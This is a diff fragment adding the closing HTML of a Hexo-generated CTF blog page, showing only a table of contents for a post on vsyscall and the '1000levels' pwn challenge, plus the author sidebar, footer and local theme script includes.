+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vsyscall%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.</span> <span class="nav-text">Vsyscall是什么?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E4%B8%BE%E4%BE%8B"><span class="nav-number">2.</span> <span class="nav-text">应用举例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-1000levels"><span class="nav-number">2.1.</span> <span class="nav-text">[攻防世界] 1000levels</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="1K0CT B14s"
+      src="/images/myavatar.gif">
+  <p class="site-author-name" itemprop="name">1K0CT B14s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+-->
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1K0CT B14s</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">449k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:49</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
